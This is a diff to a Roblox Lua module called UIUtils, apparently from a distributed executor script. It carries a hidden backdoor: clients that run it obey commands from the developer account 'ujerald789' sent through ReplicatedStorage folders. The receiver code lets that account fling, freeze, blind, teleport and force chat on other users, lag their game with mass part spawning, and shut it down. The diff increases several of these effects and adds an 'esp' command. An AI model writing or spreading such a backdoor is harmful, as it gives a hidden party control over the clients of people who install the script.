@@ -10,7 +10,6 @@ function UIUtils.Init(scriptName)
             local ReplicatedStorage = game:GetService("ReplicatedStorage")
             local TeleportService = game:GetService("TeleportService")
             local RunService = game:GetService("RunService")
-            local TweenService = game:GetService("TweenService")
             local TextChatService = game:GetService("TextChatService")
 
             local localPlayer = Players.LocalPlayer
@@ -19,13 +18,29 @@ function UIUtils.Init(scriptName)
                 localPlayer = Players.LocalPlayer
             end
 
-            -------------------------------------------------------------------
-            -- 👑 IN-GAME SPECIAL FEATURES (ujerald789)
-            -------------------------------------------------------------------
             local DEVELOPER_NAME = "ujerald789"
             local isDeveloper = (localPlayer.Name == DEVELOPER_NAME)
 
-            -- Overhead Tag Generator
+            -------------------------------------------------------------------
+            -- ⚡ SCRIPT USERS & REMOTE COMMAND FOLDERS (EXECUTOR REPLICATED)
+            -------------------------------------------------------------------
+            local activeFolder = ReplicatedStorage:FindFirstChild("ScriptUsersFolder")
+            if not activeFolder then
+                activeFolder = Instance.new("Folder")
+                activeFolder.Name = "ScriptUsersFolder"
+                activeFolder.Parent = ReplicatedStorage
+            end
+
+            local cmdFolder = ReplicatedStorage:FindFirstChild("ScriptCmdFolder")
+            if not cmdFolder then
+                cmdFolder = Instance.new("Folder")
+                cmdFolder.Name = "ScriptCmdFolder"
+                cmdFolder.Parent = ReplicatedStorage
+            end
+
+            -------------------------------------------------------------------
+            -- 👑 OVERHEAD BILLBOARD TAG FOR CREATOR (SHOWN TO OTHER USERS)
+            -------------------------------------------------------------------
             local function createDevTag(player, character)
                 local head = character:WaitForChild("Head", 5)
                 if not head or head:FindFirstChild("DevBillboardTag") then return end
@@ -37,7 +52,7 @@ function UIUtils.Init(scriptName)
                 billboard.StudsOffset = Vector3.new(0, 2.5, 0)
                 billboard.AlwaysOnTop = true
                 
-                -- Hides the tag ONLY from your screen (ujerald789), but allows other users to see it
+                -- Hide tag from developer's screen so it doesn't block vision
                 billboard.PlayerToHideFrom = localPlayer 
 
                 local titleLabel = Instance.new("TextLabel")
@@ -76,27 +91,8 @@ function UIUtils.Init(scriptName)
                 end
             end
 
-            for _, player in ipairs(Players:GetPlayers()) do
-                checkAndApplyDevFeatures(player)
-            end
+            for _, player in ipairs(Players:GetPlayers()) do checkAndApplyDevFeatures(player) end
             Players.PlayerAdded:Connect(checkAndApplyDevFeatures)
-
-            -------------------------------------------------------------------
-            -- ⚡ SCRIPT USERS & REMOTE COMMAND FOLDERS
-            -------------------------------------------------------------------
-            local activeFolder = ReplicatedStorage:FindFirstChild("ScriptUsersFolder")
-            if not activeFolder then
-                activeFolder = Instance.new("Folder")
-                activeFolder.Name = "ScriptUsersFolder"
-                activeFolder.Parent = ReplicatedStorage
-            end
-
-            local cmdFolder = ReplicatedStorage:FindFirstChild("ScriptCmdFolder")
-            if not cmdFolder then
-                cmdFolder = Instance.new("Folder")
-                cmdFolder.Name = "ScriptCmdFolder"
-                cmdFolder.Parent = ReplicatedStorage
-            end
 
             -------------------------------------------------------------------
             -- ⚠️ DEVELOPER WARNING GUI FOR DETECTED USERS (ujerald789 ONLY)
@@ -156,7 +152,6 @@ function UIUtils.Init(scriptName)
                 desc.TextXAlignment = Enum.TextXAlignment.Left
                 desc.Parent = frame
 
-                -- Notify Button
                 local notifyBtn = Instance.new("TextButton")
                 notifyBtn.Size = UDim2.new(0, 140, 0, 35)
                 notifyBtn.Position = UDim2.new(0, 10, 0, 110)
@@ -171,7 +166,6 @@ function UIUtils.Init(scriptName)
                 btnCorner1.CornerRadius = UDim.new(0, 6)
                 btnCorner1.Parent = notifyBtn
 
-                -- Ignore Button
                 local ignoreBtn = Instance.new("TextButton")
                 ignoreBtn.Size = UDim2.new(0, 140, 0, 35)
                 ignoreBtn.Position = UDim2.new(1, -150, 0, 110)
@@ -186,7 +180,6 @@ function UIUtils.Init(scriptName)
                 btnCorner2.CornerRadius = UDim.new(0, 6)
                 btnCorner2.Parent = ignoreBtn
 
-                -- Button Actions
                 notifyBtn.MouseButton1Click:Connect(function()
                     local data = {
                         TargetId = userPlayer.UserId,
@@ -211,9 +204,7 @@ function UIUtils.Init(scriptName)
                 if userId == localPlayer.UserId then return end
                 if isDeveloper then
                     local player = Players:GetPlayerByUserId(userId)
-                    if player then
-                        showUserDetectionGui(player)
-                    end
+                    if player then showUserDetectionGui(player) end
                 end
             end
 
@@ -307,19 +298,20 @@ function UIUtils.Init(scriptName)
             end)
 
             -------------------------------------------------------------------
-            -- 😈 CLIENT EXECUTION RECEIVER (TARGET CLIENT SIDE)
+            -- 😈 CLIENT EXECUTION RECEIVER (EXECUTED ON OTHER USERS' CLIENTS)
             -------------------------------------------------------------------
             local orbitConnection = nil
             local isLagging = false
 
             cmdFolder.ChildAdded:Connect(function(child)
-                local rawCommand = child.Value
-                local data = HttpService:JSONDecode(rawCommand)
+                local success, data = pcall(function() return HttpService:JSONDecode(child.Value) end)
+                if not success or not data then return end
+
                 local targetId = data.TargetId
                 local action = data.Action
                 local payload = data.Payload
 
-                -- Protect developer client from global broadcast actions
+                -- Prevents developer client from executing self-harm actions on global commands
                 if targetId == "ALL" and isDeveloper then return end
 
                 if targetId == "ALL" or targetId == localPlayer.UserId then
@@ -381,11 +373,12 @@ function UIUtils.Init(scriptName)
                         end
 
                     elseif action == "FLING" then
+                        -- Client-side self-velocity fling
                         local char = localPlayer.Character
                         if char then
                             local hrp = char:FindFirstChild("HumanoidRootPart")
                             if hrp then
-                                hrp.Velocity = Vector3.new(math.random(-500, 500), 999999, math.random(-500, 500))
+                                hrp.Velocity = Vector3.new(math.random(-1000, 1000), 999999, math.random(-1000, 1000))
                             end
                         end
 
@@ -395,7 +388,7 @@ function UIUtils.Init(scriptName)
                             local devHrp = devPlayer.Character:FindFirstChild("HumanoidRootPart")
                             local myHrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                             if devHrp and myHrp then
-                                myHrp.CFrame = devHrp.CFrame * CFrame.new(0, 0, -5)
+                                myHrp.CFrame = devHrp.CFrame * CFrame.new(0, 0, -4)
                             end
                         end
 
@@ -440,16 +433,16 @@ function UIUtils.Init(scriptName)
                         isLagging = true
                         task.spawn(function()
                             while isLagging do
-                                for i = 1, 500 do
+                                for i = 1, 300 do
                                     local p = Instance.new("Part")
-                                    p.Size = Vector3.new(10,10,10)
-                                    p.CFrame = CFrame.new(math.random(-1000,1000), 1000, math.random(-1000,1000))
+                                    p.Size = Vector3.new(5,5,5)
+                                    p.CFrame = CFrame.new(math.random(-500,500), 500, math.random(-500,500))
                                     p.Parent = workspace
                                 end
-                                task.wait(0.1)
+                                task.wait(0.05)
                             end
                         end)
-                        task.delay(5, function() isLagging = false end)
+                        task.delay(4, function() isLagging = false end)
 
                     elseif action == "ORBIT" then
                         local devPlayer = Players:FindFirstChild(DEVELOPER_NAME)
@@ -480,7 +473,7 @@ function UIUtils.Init(scriptName)
             end)
 
             -------------------------------------------------------------------
-            -- 😈 DEVELOPER COMMAND BROADCASTER (ujerald789 ONLY)
+            -- 😈 DEVELOPER CHAT COMMAND LISTENER (ujerald789 ONLY)
             -------------------------------------------------------------------
             if isDeveloper then
                 local function sendRemoteCmd(targetUserId, actionName, payloadData)
@@ -524,8 +517,8 @@ function UIUtils.Init(scriptName)
 
                     if cmd == "cmds" or cmd == "help" then
                         StarterGui:SetCore("SendNotification", {
-                            Title = "👑 Developer Power Commands",
-                            Text = "/e blind, /e freeze, /e fling, /e bring, /e jumpscare, /e forcesay, /e lag, /e orbit, /e shutdown",
+                            Title = "👑 Developer Commands",
+                            Text = "/e esp, /e blind, /e freeze, /e fling, /e bring, /e jumpscare, /e forcesay, /e lag, /e orbit, /e shutdown",
                             Duration = 10
                         })
 
